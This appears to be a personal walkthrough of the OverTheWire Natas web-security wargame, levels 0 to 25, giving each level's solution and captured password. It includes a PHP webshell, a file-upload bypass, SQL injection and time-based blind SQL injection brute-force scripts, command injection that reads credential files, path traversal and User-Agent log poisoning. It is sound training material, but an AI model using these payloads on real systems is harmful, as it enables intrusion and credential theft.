# 0

Given:

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

Looking at the full page source we can find the password at line 16.

```html
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```

# 1

```
Username: natas1
URL:      http://natas1.natas.labs.overthewire.org
```

Same as before, but just shift+right click on firefox.

```html
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```

# 2

```
Username: natas2
URL:      http://natas2.natas.labs.overthewire.org
```

There is nothing in this page except for `<img src="files/pixel.png">`. The image is not interesting, but going to the files directory shows a list of files, one being `users.txt`, which includes the password.

```
# username:password
...
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```

# 3

```
Username: natas3
URL:      http://natas3.natas.labs.overthewire.org
```

The source code mentions `Not even Google will find it this time...` which means that the website is hiding certain directories from appearing in search engines. Checking robots.txt we can find this:

> User-agent: *
> Disallow: /s3cr3t/

Checking s3cr3t directory you can use the same method as natas2 as it includes users.txt.

```
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

# 4

```
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org
```

We get denied access when visiting the website, saying that `authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`. However we don't have access to natas5 yet, so we have to change the referer header when visiting the website.

Normally you can use burpsuite, but i found a firefox addon called [Referer Modifier](https://addons.mozilla.org/en-US/firefox/addon/referer-modifier/) by Airtower that would let me set the referer as `http://natas5.natas.labs.overthewire.org/` on any website. When doing so we can finally see the password.

```
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK  
```

# 5

```
Username: natas5
URL:      http://natas5.natas.labs.overthewire.org
```

It says we aren't logged in. There's no other way to log in. I checked for any stored data using a cookie editor addon such as [Cookie Quick Manager](https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/), and I found out that there is one boolean cookie named `loggedin` which is set to 0. I set it to 1 which means that I am now considered logged in after refreshing the page.

```
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

# 6

```
Username: natas6
URL:      http://natas6.natas.labs.overthewire.org
```

It asks us for a secret key. It also gives us the PHP source code of the checker, which mentions ``include "includes/secret.inc";``. Visiting that file gives us the secret key. (Make sure to view source)

> $secret = "FOEIUWGHFEEUHOFUOIU";

Input that and we get the password.

```
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS 
```

# 7

```
Username: natas7
URL:      http://natas7.natas.labs.overthewire.org
```

The hint in the source code says `password for webuser natas8 is in /etc/natas_webpass/natas8` but going to that directory doesn't work. But clicking on the website buttons take you to `index.php?page=home` and `index.php?page=about` respectiely. So going to `index.php?page=/etc/natas_webpass/natas8` gives us the password.

```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

# 8

```
Username: natas8
URL:      http://natas8.natas.labs.overthewire.org
```

The PHP source code provides the secret key, but it is encoded with a function that is also given.

> ```php
> $encodedSecret = "3d3d516343746d4d6d6c315669563362";
> 
> function encodeSecret($secret) {
>     return bin2hex(strrev(base64_encode($secret)));
> }
> ```

The function first encodes the secret key into base64, then reverses it, and finally converts it to hexadecimal. To get the secret key we should do this backwards.

1. Convert `3d3d516343746d4d6d6c315669563362` hex into ascii: `==QcCtmMml1ViV3b`

2. Reverse the string: `b3ViV1lmMmtCcQ==`

3. Decode the base64: `oubWYf2kBq`

Enter the key and you will get the password

```
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t 
```

# 9

```
Username: natas9
URL:      http://natas9.natas.labs.overthewire.org
```

The program provides source code:

> ```php
> if($key != "") {
>     passthru("grep -i $key dictionary.txt");
> }
> ```

Basically all it does is return all the lines in dictionary.txt that partly contain the input. We can use this to print out the password for the next level, by printing the file `/etc/natas_webpass/natas10` instead, and commenting the rest of the string out using `#`. Also, entering `.` prints out the entire file. So i entered in `. /etc/natas_webpass/natas10 #` to get the password.

```
Output:

t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

# 10

```
Username: natas10
URL:      http://natas10.natas.labs.overthewire.org
```

I guess the filter is broken, because our previous solution still works: `. /etc/natas_webpass/natas11 #`

```
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

# 11

```
Username: natas11
URL:      http://natas11.natas.labs.overthewire.org
```

The website stores a `data` cookie with the value `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`.

Looking at the source code, it seems that the cookie is actually an array that stores the background color `bgcolor` as well as `showpassword`, but interpreted in JSON text format. The text is run through the xor_encrypt function, which xor's every letter by a secret key text. The result is then coverted into base64 and stored as the cookie. 

Since our cookie is based on the default array which is given: 

> $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

we need to pass a cookie that has `showpassword` as `yes` so we can get the password.

The first thing we need to do however is get the key, we can do this by xoring the cookie by the default array in JSON. (We're going to use PHP for this one)

> ```php
> <?php
> $text = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")); 
> $key = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D");
> $outText = '';
> for ($i=0;$i<strlen($text);$i++) {
>   $outText .= $text[$i] ^ $key[$i % strlen($key)];
> }
> print $outText;
> print "\n";
> ?>
> ```

The key repeats, so the result is actually `eDWo`. With this we can place the key accordingly to get a cookie with the value.

> ```php
> <?php
> $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")); 
> $key = "eDWo";
> $outText = '';
> for ($i=0;$i<strlen($text);$i++) {
>   $outText .= $text[$i] ^ $key[$i % strlen($key)];
> }
> print base64_encode($outText);
> print "\n";
> ?>
> ```

We get our new cookie! `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`

Put this in your cookie editor and refresh the page.

```
The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

# 12

```
Username: natas12
URL:      http://natas12.natas.labs.overthewire.org
```

We get to input JPEG files. When I input a file, it seems that the only thing it checks for is if the file exceeds 1kb in size, otherwise it uploads and becomes accessible through the website. 

What we should upload instead is a PHP file that lets us execute shell commands through the website. A PHP webshell I found was ``<?php echo passthru($_GET['cmd']); ?>``, just put that on a file.

However, it renames the file with a random string and puts .jpg in the end. Looking through the source code it seems that the new filename is generated when we visit the site, and is stored on the html at line 17.

> `<input type="hidden" name="filename" value="w01h6ubw9x.jpg" />`

So all we have to do is inspect element and change the .jpg to .php.

Once we upload the file, we can run the file by clicking the link. We can then add `?cmd=cat /etc/natas_webpass/natas13` after the file name to see the password.

```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

# 13

```
Username: natas13
URL:      http://natas13.natas.labs.overthewire.org
```

The code now uses exif to check what file type it is. Basically checking the first few bytes and seeing whether it matches for a jpeg file.  The signature is `FF D8 FF E0`, we need a way to put that on our PHP file from last level. I used this python code to do this.

> ```python
> hex_jpeg = bytearray([0xFF, 0xD8, 0xFF, 0xE0])
> code = "<?php echo passthru($_GET['cmd']); ?>"
> with open('newCode.php', 'wb') as file:
>     file.write(hex_jpeg)
>     file.write(code.encode('utf-8'))
> ```

Once that's done, just follow the same steps as the previous level. Make sure you don't pick up the first four characters. (They may appear as a diamond with a question mark)

```
���� z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ 
```

# 14

```
Username: natas14
URL:      http://natas14.natas.labs.overthewire.org
```

The website is using SQL to get a username and password onto the website. Looking onto the source code it seems that the query is displayed like this:

> `SELECT * from users where username="(user)"and password="(pass)";`

Since we can put anything on the input, you can just leave the username blank, and put `"  or "1" = "1` as our password. Basically by doing this, we get all the users on the site which is more than 0 rows needed to get the success message.

```
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

# 15

```
Username: natas15
URL:      http://natas15.natas.labs.overthewire.org
```

The website uses SQL to check if a user exists. Just like the previous level, the input is unfiltered, but it looks like we need to brute force the password ourselves. We can use `natas16` as the user because it exists.

Instead of using the text box we can use the URL instead. After the index.php, we can try doing  `SELECT * from users where username="natas16" and password LIKE BINARY "(pass)%"`. The LIKE BINARY will help us compare the password input case-sensitively, and the % key will fill out the rest of the password, so we can brute force every character until we get the full password.  We can tell if it works because it will say "This user exists", while incorrect passwords are "This user doesn't exist". 

For the sake of time I just looked for other solutions for this level and took [this person's code.](https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas15.md) Brute forcing itself is time consuming anyway. Here's the python code.

> ```python
> import requests
> target = 'http://natas15.natas.labs.overthewire.org'
> charset_0 = (
>     '0123456789' +
>     'abcdefghijklmnopqrstuvwxyz' +
>     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
> )
> webauth = ('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
> charset_1 = ''
> for c in charset_0:
>     username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
>     r = requests.get(target,
>         auth=webauth,
>         params={"username": username}
>     )
>     if "This user exists" in r.text:
>         charset_1 += c
>         print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
> 
> password = ""
> while len(password) != 32:
>     for c in charset_1:
>         t = password + c
>         username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
>         r = requests.get(target,
>             auth=webauth,
>             params={"username": username}
>         )
>         if "This user exists" in r.text:
>             print ('PASS: ' + t.ljust(32, '*'))
>             password = t
>             break
> ```

Once that's done we get the password.

```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

# 16

```
Username: natas16
URL:      http://natas16.natas.labs.overthewire.org
```

So this one is like natas10 except it filters out even more characters, so now our solution finally doesn't work. But Bash also allows us to execute commands inside a command using `$(cmd)`, which is not blocked in the website. So if we did something like `$(echo hello) helium`, it will end up being`hello helium`and return no result.

Looks like we need to bruteforce again... so the command we will use is `(grep -E ^(pass).* /etc/natas_webpass/natas17)helium`. This lets us run a regex expression that runs successfully if the starting characters, `(pass)`, match the start of the password. If it does, it will return a blank message, but wrong characters will just return the words with helium.

I used the same python code from the previous level, but with some changes.

> ```python
> import requests
> target = 'http://natas16.natas.labs.overthewire.org'
> charset_0 = (
>     '0123456789' +
>     'abcdefghijklmnopqrstuvwxyz' +
>     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
> )
> webauth = ('natas16','hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
> charset_1 = ''
> 
> for c in charset_0:
>     username = ('$(grep ' + c +' /etc/natas_webpass/natas17)helium')
>     r = requests.get(target,
>         auth=webauth,
>         params={"needle": username}
>     )
>     if "helium" not in r.text:
>         charset_1+=c
>         print ('CSET: ' + charset_1.ljust(32, '*'))
> 
> password = ""
> while len(password) != 32:
>     for c in charset_1:
>         t = password + c
>         username = ('$(grep -E ^' + t +'.* /etc/natas_webpass/natas17)helium')
>         r = requests.get(target,
>             auth=webauth,
>             params={"needle": username}
>         )
>         if "helium" not in r.text:
>             print ('PASS: ' + t.ljust(32, '*'))
>             password = t
>             break
> ```

This is the password we get:

```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

# 17

```
Username: natas17
URL:      http://natas17.natas.labs.overthewire.org
```

This is just natas15 but now it doesn't confirm if we got it right with the text. Both correct and incorrect usernames don't have anything to display. So we have to rely purely on SQL to brute force. One way we can do this is with the `sleep(secs)` command, so that if a string exists in the password then it will sleep for a number of seconds (We'll use two, but you can increase or decrease it if you want). The input will look like this: `natas16" AND password LIKE BINARY "(pass)&" AND sleep(2) #` You'll be waiting alot longer though. Here's the updated code.

```python
import requests
target = 'http://natas17.natas.labs.overthewire.org'
charset_0 = (
    '0123456789' +
    'abcdefghijklmnopqrstuvwxyz' +
    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
webauth = ('natas17','EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
charset_1 = ''
for c in charset_0:
    username = ('natas18" AND password LIKE BINARY "%' + c +'%" AND sleep(2) #')
    r = requests.get(target,
        auth=webauth,
        params={"username": username}
    )
    if r.elapsed.total_seconds() >= 2:
        charset_1 += c
        print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))

password = ""
while len(password) != 32:
    for c in charset_1:
        t = password + c
        username = ('natas18" AND password LIKE BINARY "' + t +'%" AND sleep(2) #')
        r = requests.get(target,
            auth=webauth,
            params={"username": username}
        )
        if r.elapsed.total_seconds() >= 2:
            print ('PASS: ' + t.ljust(32, '*'))
            password = t
            break
```

We got this password:

```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

# 18

```
Username: natas18
URL:      http://natas18.natas.labs.overthewire.org
```

It looks like a login page where we need to be admin to get the password. Looking at the source code it seems it uses a cookie called `PHPSESSID`, which goes from 0 to 640, and tells what user it is logged onto. So we can just go through the entire range and see which session ID is admin.  We don't need to input anything else! 

```python
import requests
target = 'http://natas18.natas.labs.overthewire.org'
webauth = ('natas18','6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

for uid in range(640):
    r = requests.get(target,
        auth=webauth,
        cookies={"PHPSESSID": str(uid)}
    )
    print("ID: " + str(uid))
    if "You are an admin. The credentials for the next level are:" in r.text:
        print(r.text.split("Password:")[1].split('<')[0].strip())
        break
```

The password we get in session id 119 is

```
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

# 19

```
Username: natas19
URL:      http://natas19.natas.labs.overthewire.org
```

According to the website it is similar to the previous levels except the session ID is not sequential. I logged in as "admin" with a random password, saw the cookie and realized it was in hexadecimal, `3538302d61646d696e`, which translates to `580-admin`. So we just do the same thing as last time except add the extra text and convert to hex.

```python
import requests
target = 'http://natas19.natas.labs.overthewire.org'
webauth = ('natas19','tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

for uid in range(640):
    newid = (str(uid) + "-admin").encode("utf-8").hex()
    r = requests.get(target,
        auth=webauth,
        cookies={"PHPSESSID": newid}
    )
    print("ID: " + newid)
    if "You are an admin. The credentials for the next level are:" in r.text:
        print(r.text.split("Password:")[1].split('<')[0].strip())
        break
```

We get this at ID: 281

```
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```

# 20

```
Username: natas20
URL:      http://natas20.natas.labs.overthewire.org
```

For this one it seems the cookie is completely random, but the source code changes how it is read and written. I was stumped in this level, but after looking around, I found out that it uses a file to store two values: `name` and `admin`, and they are stored in plaintext and are separated with a newline character. We can only set `name` however, and we need to do this through the URL only. I did `http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin+1`, then refreshed the page. Sometimes this didn't work and I had to delete the cookie beforehand.

```
You are an admin. The credentials for the next level are:

Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```

# 21

```
Username: natas21
URL:      http://natas21.natas.labs.overthewire.org
```

The main website doesn't do anything other than display the password if `admin` equals 1. The CSS experimenter website, however, lets us change the value of `admin` freely. It seems we also need to set `submit` to `Update` for it to work aswell. I entered `http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=Update&admin=1` and it sets the cookie automatically. Since both websites are basically the same, all we need to do is copy the cookie of the experimenter website and set it as the one for the main site aswell.

```
You are an admin. The credentials for the next level are:

Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```

# 22

```
Username: natas22
URL:      http://natas22.natas.labs.overthewire.org
```

This one was pretty simple.  All you need to do is pass `?revelio` into the URL. However it auto-redirects and doesn't show the password, so I used the curl command: `curl -i -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz http://natas22.natas.labs.overthewire.org/\?revelio`

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
```

# 23

```
Username: natas23
URL:      http://natas23.natas.labs.overthewire.org
```

This is also pretty simple, it just checks if the given password has `iloveyou` anywhere on the string, and is atleast 10 characters. I just used `1111iloveyou`.

```
The credentials for the next level are:

Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```

# 24

```
Username: natas24
URL:      http://natas24.natas.labs.overthewire.org
```

This website uses `strcmp()` to see if a password is the same as the actual password string, however it is censored. Apparantly this function is kinda broken in PHP because it returns true if you pass in a non-string as a password. So i passed in an empty array by doing `?passwd[]`.

```
The credentials for the next level are:

Username: natas25 Password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
```

# 25

```
Username: natas25
URL:      http://natas25.natas.labs.overthewire.org
```

The website shows a quote, and a selection of two langauges that switches the text. Looking at the source code, the `lang` variable that contains the language is returning the file which contains the quotes. It's on a fixed directory which we don't know the location, so we have to directory traverse to find the password.

However, there's also this function called `safeinclude($filename)`, which does two things:

1. removes all instances of `../`. Luckily it does this only once so we can bypass this by doing `....//`.

2. stops from running any further if it contains `natas_webpass`, so we can't access the file directly.

That was when I found another function:

> ```php
>     function logRequest($message){
>         $log="[". date("d.m.Y H::i:s",time()) ."]";
>         $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
>         $log=$log . " \"" . $message ."\"\n"; 
>         $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
>         fwrite($fd,$log);
>         fclose($fd);
>     }
> ```

This creates a file based on my session id, which is stored in our PHPSESSID cookie (MIne is `vanjddmfn2t60ii6m4faoov3bq`). We can access it by doing `?lang=....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_vanjddmfn2t60ii6m4faoov3bq.log` 

Another thing about this log is that it parses our user agent for some reason. We can put PHP code on our user agent and it will run. So using an user agent editor such as [this](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/) will help us change our user agent to `<?php system('cat /etc/natas_webpass/natas26'); ?>`.  

After changing our user agent and accessing the log file, we get our password in the HTML source.

```
[29.12.2023 04::25:03] 8A506rfIAXbKKk68yJeuTuRq4UfcK70k
```

# 26

```
Username: natas26
URL:      http://natas26.natas.labs.overthewire.org
```
